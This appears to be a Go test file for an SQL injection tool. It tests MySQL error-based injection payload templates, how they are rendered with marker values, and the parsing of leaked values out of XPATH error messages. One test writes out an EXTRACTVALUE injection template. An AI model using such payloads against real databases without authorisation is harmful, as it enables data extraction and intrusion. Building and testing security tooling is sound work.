package dbms

import (
	"strings"
	"testing"
)

func TestMySQLErrorPayloadsCountAndFields(t *testing.T) {
	ps := MySQLErrorPayloads()
	if len(ps) != 8 {
		t.Fatalf("expected 8 MySQL error payloads, got %d", len(ps))
	}
	for _, p := range ps {
		if p.Title == "" {
			t.Errorf("payload missing title")
		}
		if p.Template == "" {
			t.Errorf("payload %q missing template", p.Title)
		}
		if !strings.Contains(p.Template, "{query}") {
			t.Errorf("payload %q has no {query} placeholder", p.Title)
		}
		if p.MinMySQLVersion == "" {
			t.Errorf("payload %q missing MinMySQLVersion", p.Title)
		}
	}
}

func TestRenderErrorPayloadFillsPlaceholders(t *testing.T) {
	ps := MySQLErrorPayloads()
	// The AND EXTRACTVALUE payload uses 0x7e markers and offsets.
	got := RenderErrorPayload(ps[2].Template, "SELECT VERSION()", "", "")
	if !strings.Contains(got, "(SELECT VERSION())") {
		t.Fatalf("query not injected: %q", got)
	}
	if !strings.Contains(got, "0x7e") {
		t.Fatalf("default 0x7e marker not applied: %q", got)
	}
	if strings.Contains(got, "{query}") {
		t.Fatalf("placeholder left behind: %q", got)
	}
}

func TestRenderErrorPayloadCustomMarkers(t *testing.T) {
	tpl := `AND EXTRACTVALUE(8144,CONCAT(0x{mark1},(SELECT ({query})),0x{mark2}))`
	got := RenderErrorPayload(tpl, "DATABASE()", "5f5f", "5f5f")
	if !strings.Contains(got, "0x5f5f") {
		t.Fatalf("custom markers not applied: %q", got)
	}
}

func TestParseTildeExtractsValue(t *testing.T) {
	body := []byte("XPATH syntax error: '~MySQL 5.1.41~'")
	if got := ParseTilde(body); got != "MySQL 5.1.41" {
		t.Fatalf("ParseTilde = %q, want %q", got, "MySQL 5.1.41")
	}
	if got := ParseTilde([]byte("no markers here")); got != "" {
		t.Fatalf("expected empty for no markers, got %q", got)
	}
	if got := ParseTilde([]byte("only one ~ marker")); got != "" {
		t.Fatalf("expected empty for unclosed marker, got %q", got)
	}
}
